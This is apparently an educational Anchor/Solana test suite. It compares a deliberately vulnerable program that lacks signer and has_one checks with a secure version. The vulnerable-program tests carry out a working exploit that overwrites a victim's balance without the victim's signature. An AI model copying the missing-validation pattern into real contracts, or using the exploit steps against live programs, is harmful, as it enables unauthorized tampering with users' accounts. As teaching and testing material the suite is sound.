/**
 * Missing Validation Pattern - Exploit Demonstration Tests
 *
 * This test suite demonstrates account validation vulnerabilities
 * that occur when programs fail to verify signer authorization and
 * ownership constraints on account operations.
 *
 * Pattern: Missing Validation
 * Vulnerability: No signer verification or owner check on sensitive operations
 * Impact: Unauthorized users can modify any account's state
 *
 * Key Insight: Anchor's Signer<'info> type and has_one constraint are
 * critical security mechanisms. Without them, anyone can call your
 * program with arbitrary accounts and modify state they don't own.
 */

import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { expect } from "chai";
import BN from "bn.js";

// =============================================================================
// HELPER FUNCTIONS
// =============================================================================

/**
 * Sleep helper for RPC rate limit handling.
 * Use between tests that hit RPC if needed.
 */
async function sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// =============================================================================
// TEST SUITE
// =============================================================================

describe("Missing Validation Pattern", () => {
    // Provider and programs
    let provider: anchor.AnchorProvider;
    let vulnerableProgram: Program;
    let secureProgram: Program;

    // Keypairs for test accounts
    let victimKeypair: anchor.web3.Keypair;
    let attackerKeypair: anchor.web3.Keypair;

    // PDA addresses - will be derived in tests
    let victimVulnerablePda: anchor.web3.PublicKey;
    let victimSecurePda: anchor.web3.PublicKey;

    // =============================================================================
    // SETUP HOOKS
    // =============================================================================

    before(async () => {
        // Configure the client to use the local cluster
        // This runs within anchor test environment which sets ANCHOR_PROVIDER_URL
        provider = anchor.AnchorProvider.env();
        anchor.setProvider(provider);

        // Load programs from anchor.workspace
        vulnerableProgram = anchor.workspace.VulnerableMissingValidation as Program;
        secureProgram = anchor.workspace.SecureMissingValidation as Program;

        console.log("\n");
        console.log("  ========================================");
        console.log("  MISSING VALIDATION PATTERN - EXPLOIT DEMO");
        console.log("  ========================================");
        console.log("");
        console.log("  Vulnerable Program ID:", vulnerableProgram.programId.toString());
        console.log("  Secure Program ID:", secureProgram.programId.toString());
        console.log("");
    });

    beforeEach(async () => {
        // Create fresh keypairs for each test to ensure isolation
        victimKeypair = anchor.web3.Keypair.generate();
        attackerKeypair = anchor.web3.Keypair.generate();

        // Airdrop SOL to victim and attacker for transaction fees
        const airdropVictim = await provider.connection.requestAirdrop(
            victimKeypair.publicKey,
            2 * anchor.web3.LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropVictim);

        const airdropAttacker = await provider.connection.requestAirdrop(
            attackerKeypair.publicKey,
            2 * anchor.web3.LAMPORTS_PER_SOL
        );
        await provider.connection.confirmTransaction(airdropAttacker);

        // Derive PDAs for victim's accounts
        [victimVulnerablePda] = anchor.web3.PublicKey.findProgramAddressSync(
            [Buffer.from("user_account"), victimKeypair.publicKey.toBuffer()],
            vulnerableProgram.programId
        );

        [victimSecurePda] = anchor.web3.PublicKey.findProgramAddressSync(
            [Buffer.from("user_account"), victimKeypair.publicKey.toBuffer()],
            secureProgram.programId
        );
    });

    // =============================================================================
    // VULNERABLE PROGRAM TESTS
    // =============================================================================

    describe("VULNERABLE Program", () => {
        it("✗ allows unauthorized balance update", async () => {
            // ATTACK: Demonstrates how missing validation allows unauthorized access
            console.log("\n");
            console.log("  ----------------------------------------");
            console.log("  TEST: Unauthorized Balance Update Exploit");
            console.log("  ----------------------------------------");
            console.log("");
            console.log("  Scenario: Attacker attempts to update victim's balance");
            console.log("  Expected: Unauthorized modification succeeds (vulnerability)");
            console.log("");

            // Step 1: Victim initializes their account with initial balance of 0
            console.log("  Step 1: Victim initializes account...");
            await vulnerableProgram.methods
                .initialize()
                .accounts({
                    userAccount: victimVulnerablePda,
                    authority: victimKeypair.publicKey,
                    systemProgram: anchor.web3.SystemProgram.programId,
                })
                .signers([victimKeypair])
                .rpc();

            // Fetch account to verify initialization
            let accountBefore = await vulnerableProgram.account.userAccount.fetch(victimVulnerablePda);
            const balanceBefore = accountBefore.balance.toNumber();
            console.log("  Victim's initial balance:", balanceBefore);
            console.log("  Victim's authority:", accountBefore.authority.toString());

            // Step 2: Attacker calls update_balance on victim's account
            // NOTE: The vulnerable program accepts any pubkey as authority without verification
            console.log("");
            console.log("  Step 2: Attacker attempts unauthorized update...");
            console.log("  Attacker pubkey:", attackerKeypair.publicKey.toString());

            const maliciousBalance = 999999;

            // ATTACK: Attacker can update victim's balance by passing victim's pubkey
            // as authority WITHOUT signing as that authority. The vulnerable program only
            // uses authority to derive the PDA, but doesn't verify the signer.
            await vulnerableProgram.methods
                .updateBalance(new BN(maliciousBalance))
                .accounts({
                    userAccount: victimVulnerablePda,
                    authority: victimKeypair.publicKey, // Victim's pubkey, but attacker sends tx
                })
                .signers([]) // No signer needed - this is the vulnerability!
                .rpc();

            // Step 3: Verify the exploit succeeded
            let accountAfter = await vulnerableProgram.account.userAccount.fetch(victimVulnerablePda);
            const balanceAfter = accountAfter.balance.toNumber();

            console.log("");
            console.log("  Step 3: Verifying exploit results...");
            console.log("  Balance BEFORE attack:", balanceBefore);
            console.log("  Balance AFTER attack:", balanceAfter);

            // Assert that the balance WAS modified (exploit succeeded)
            expect(balanceAfter).to.equal(maliciousBalance);

            console.log("");
            console.log("  ⚠️  EXPLOIT SUCCESSFUL: Unauthorized modification!");
            console.log("  The attacker modified victim's balance without authorization.");
            console.log("  Root cause: authority account is not verified as a signer.");
            console.log("  ----------------------------------------\n");
        });

        it("✗ demonstrates impact of missing owner check", async () => {
            // ATTACK: Shows attacker can pass any pubkey as authority
            console.log("\n");
            console.log("  ----------------------------------------");
            console.log("  TEST: Missing Owner Check Bypass");
            console.log("  ----------------------------------------");
            console.log("");
            console.log("  Scenario: Attacker bypasses owner check by passing arbitrary authority");
            console.log("  Expected: State modification succeeds without proper ownership verification");
            console.log("");

            // Step 1: Victim initializes their account
            console.log("  Step 1: Victim initializes account...");
            await vulnerableProgram.methods
                .initialize()
                .accounts({
                    userAccount: victimVulnerablePda,
                    authority: victimKeypair.publicKey,
                    systemProgram: anchor.web3.SystemProgram.programId,
                })
                .signers([victimKeypair])
                .rpc();

            let accountBefore = await vulnerableProgram.account.userAccount.fetch(victimVulnerablePda);
            console.log("  Account authority set to victim:", accountBefore.authority.toString());
            console.log("  Initial balance:", accountBefore.balance.toNumber());

            // Step 2: Attacker demonstrates they can modify state without being the owner
            // The vulnerable program has no has_one constraint, so ANY account can be passed
            console.log("");
            console.log("  Step 2: Attacker calls update with victim's authority (not signer)...");

            const attackerChosenBalance = 777777;

            // VULNERABILITY: No has_one constraint means the program doesn't verify
            // that user_account.authority matches the passed authority account
            await vulnerableProgram.methods
                .updateBalance(new BN(attackerChosenBalance))
                .accounts({
                    userAccount: victimVulnerablePda,
                    authority: victimKeypair.publicKey, // Pass victim's key but don't sign
                })
                .signers([]) // Attacker doesn't need to provide any signature!
                .rpc();

            // Step 3: Verify the bypass worked
            let accountAfter = await vulnerableProgram.account.userAccount.fetch(victimVulnerablePda);

            console.log("");
            console.log("  Step 3: Checking if owner check was bypassed...");
            console.log("  Account authority (unchanged):", accountAfter.authority.toString());
            console.log("  New balance (modified by attacker):", accountAfter.balance.toNumber());

            expect(accountAfter.balance.toNumber()).to.equal(attackerChosenBalance);
            expect(accountAfter.authority.toString()).to.equal(victimKeypair.publicKey.toString());

            console.log("");
            console.log("  ⚠️  EXPLOIT: Owner check bypassed!");
            console.log("  Attacker modified balance despite not being the authority.");
            console.log("  Root cause: No has_one = authority constraint on user_account.");
            console.log("  ----------------------------------------\n");
        });
    });

    // =============================================================================
    // SECURE PROGRAM TESTS
    // =============================================================================

    describe("SECURE Program", () => {
        it("✓ blocks unauthorized balance update", async () => {
            // SECURITY: Demonstrates how proper validation prevents unauthorized access
            console.log("\n");
            console.log("  ----------------------------------------");
            console.log("  TEST: Unauthorized Access Blocked");
            console.log("  ----------------------------------------");
            console.log("");
            console.log("  Scenario: Attacker attempts to update victim's balance");
            console.log("  Expected: Unauthorized access blocked (secure)");
            console.log("");

            // Step 1: Victim initializes their account on secure program
            console.log("  Step 1: Victim initializes account on SECURE program...");
            await secureProgram.methods
                .initialize()
                .accounts({
                    userAccount: victimSecurePda,
                    authority: victimKeypair.publicKey,
                    systemProgram: anchor.web3.SystemProgram.programId,
                })
                .signers([victimKeypair])
                .rpc();

            let accountBefore = await secureProgram.account.userAccount.fetch(victimSecurePda);
            console.log("  Victim's initial balance:", accountBefore.balance.toNumber());
            console.log("  Victim's authority:", accountBefore.authority.toString());

            // Step 2: Attacker attempts unauthorized update
            console.log("");
            console.log("  Step 2: Attacker attempts unauthorized update...");
            console.log("  Attacker pubkey:", attackerKeypair.publicKey.toString());

            // Derive attacker's PDA (different from victim's)
            const [attackerPda] = anchor.web3.PublicKey.findProgramAddressSync(
                [Buffer.from("user_account"), attackerKeypair.publicKey.toBuffer()],
                secureProgram.programId
            );

            let attackSucceeded = false;
            let errorReceived = "";

            try {
                // SECURITY TEST: Try to update victim's account with attacker as signer
                // This should fail because:
                // 1. has_one = authority constraint requires user_account.authority == signer
                // 2. Signer<'info> type requires the authority to actually sign
                await secureProgram.methods
                    .updateBalance(new BN(999999))
                    .accounts({
                        userAccount: victimSecurePda, // Victim's account
                        authority: attackerKeypair.publicKey, // Attacker as authority
                    })
                    .signers([attackerKeypair]) // Attacker signs
                    .rpc();

                attackSucceeded = true;
            } catch (err: any) {
                errorReceived = err.message || err.toString();
                console.log("  Transaction rejected with error.");
            }

            // Step 3: Verify the attack was blocked
            console.log("");
            console.log("  Step 3: Verifying security held...");

            // Fetch account to confirm balance unchanged
            let accountAfter = await secureProgram.account.userAccount.fetch(victimSecurePda);
            console.log("  Balance after attack attempt:", accountAfter.balance.toNumber());

            expect(attackSucceeded).to.be.false;
            expect(accountAfter.balance.toNumber()).to.equal(0); // Unchanged

            // Verify the error indicates constraint failure
            expect(errorReceived).to.include("ConstraintHasOne");

            console.log("");
            console.log("  ✓ SECURITY VERIFIED: Unauthorized access blocked!");
            console.log("  The secure program rejected the unauthorized modification.");
            console.log("  Error: ConstraintHasOne - authority doesn't match account owner.");
            console.log("  ----------------------------------------\n");
        });

        it("✓ enforces owner validation on all operations", async () => {
            // SECURITY: Verifies that only the true authority can modify their account
            console.log("\n");
            console.log("  ----------------------------------------");
            console.log("  TEST: Owner Validation Enforced");
            console.log("  ----------------------------------------");
            console.log("");
            console.log("  Scenario: Verify only true authority can modify account");
            console.log("  Expected: Authorized update succeeds, unauthorized fails");
            console.log("");

            // Step 1: Victim initializes their account
            console.log("  Step 1: Victim initializes account...");
            await secureProgram.methods
                .initialize()
                .accounts({
                    userAccount: victimSecurePda,
                    authority: victimKeypair.publicKey,
                    systemProgram: anchor.web3.SystemProgram.programId,
                })
                .signers([victimKeypair])
                .rpc();

            let account = await secureProgram.account.userAccount.fetch(victimSecurePda);
            console.log("  Account initialized with authority:", account.authority.toString());
            console.log("  Initial balance:", account.balance.toNumber());

            // Step 2: TRUE authority (victim) updates their own balance - should succeed
            console.log("");
            console.log("  Step 2: TRUE authority updates balance...");

            const legitimateNewBalance = 500;
            await secureProgram.methods
                .updateBalance(new BN(legitimateNewBalance))
                .accounts({
                    userAccount: victimSecurePda,
                    authority: victimKeypair.publicKey,
                })
                .signers([victimKeypair]) // Victim signs - they are the authority
                .rpc();

            account = await secureProgram.account.userAccount.fetch(victimSecurePda);
            console.log("  Balance after authorized update:", account.balance.toNumber());
            expect(account.balance.toNumber()).to.equal(legitimateNewBalance);

            // Step 3: ATTACKER tries to modify - should fail
            console.log("");
            console.log("  Step 3: ATTACKER attempts to modify...");

            let attackerUpdateFailed = false;
            try {
                await secureProgram.methods
                    .updateBalance(new BN(0)) // Try to drain balance
                    .accounts({
                        userAccount: victimSecurePda,
                        authority: attackerKeypair.publicKey,
                    })
                    .signers([attackerKeypair])
                    .rpc();
            } catch (err) {
                attackerUpdateFailed = true;
                console.log("  Attacker's transaction rejected (as expected).");
            }

            // Step 4: Verify owner validation held
            console.log("");
            console.log("  Step 4: Verifying owner validation...");

            account = await secureProgram.account.userAccount.fetch(victimSecurePda);
            console.log("  Final balance (should be unchanged from authorized update):", account.balance.toNumber());

            expect(attackerUpdateFailed).to.be.true;
            expect(account.balance.toNumber()).to.equal(legitimateNewBalance);

            console.log("");
            console.log("  ✓ SECURITY: Owner validation enforced!");
            console.log("  - Authorized update by true owner: SUCCEEDED");
            console.log("  - Unauthorized update by attacker: BLOCKED");
            console.log("  The has_one constraint ensures only the authority can modify.");
            console.log("  ----------------------------------------\n");
        });
    });
});
